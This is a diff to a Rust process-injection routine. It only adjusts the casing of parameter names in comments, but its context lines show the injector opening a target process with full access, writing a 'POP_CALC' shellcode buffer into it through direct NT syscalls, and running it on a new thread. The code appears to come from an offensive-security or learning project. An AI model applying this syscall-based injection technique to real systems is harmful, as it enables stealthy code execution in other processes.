@@ -65,7 +65,7 @@ fn injector(pid: Option<u32>) {
 	let mut thread_handle: isize = 0;
 	let oa_process = ObjectAttributes::default();
 
-	// This is "pseudo Handle", a sort of handle constant
+	// This is "pseudo handle", a sort of handle constant
 	// The value -1 means it's a handle to our own process
 	let mut process_handle: isize = -1;
 
@@ -81,7 +81,7 @@ fn injector(pid: Option<u32>) {
             &mut process_handle, //  [out]          PHANDLE            ProcessHandle,
             PROCESS_ALL_ACCESS,  //  [in]           ACCESS_MASK        DesiredAccess,
             &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
-            &client_id);         //  [in, optional] PCLIENT_ID         ClientId
+            &client_id);         //  [in, optional] PCLIENT_ID         client_id
 
 	}
 	let mut buf_size: usize = POP_CALC.len();
@@ -102,7 +102,7 @@ fn injector(pid: Option<u32>) {
 	syscall!("NtWriteVirtualMemory",
         process_handle,     // [in]            HANDLE ProcessHandle,
         base_addr,          // [in]            PVOID  *BaseAddress,
-        &POP_CALC,          // [in]            PVOID  Buffer,
+        &POP_CALC,          // [in]            PVOID  buffer,
         buf_size,           // [in]            ULONG  NumberOfBytesToWrite,
         &mut bytes_written);
 	// [out, optional] PULONG NumberOfBytesWritten ,
@@ -135,13 +135,13 @@ fn injector(pid: Option<u32>) {
 	// Wait for the thread to execute
 	// Timeout is a null pointer, so we wait indefinitely
 	syscall!("NtWaitForSingleObject",
-        thread_handle,          //  [in] HANDLE         Handle,
+        thread_handle,          //  [in] HANDLE         handle,
         0,                      //  [in] BOOLEAN        Alertable,
         null::<*mut c_void>()); //  [in] PLARGE_INTEGER Timeout
 
 	// Close the handle
 	syscall!("NtClose",
-        thread_handle); // [in] HANDLE Handle
+        thread_handle); // [in] HANDLE handle
 }
 
 
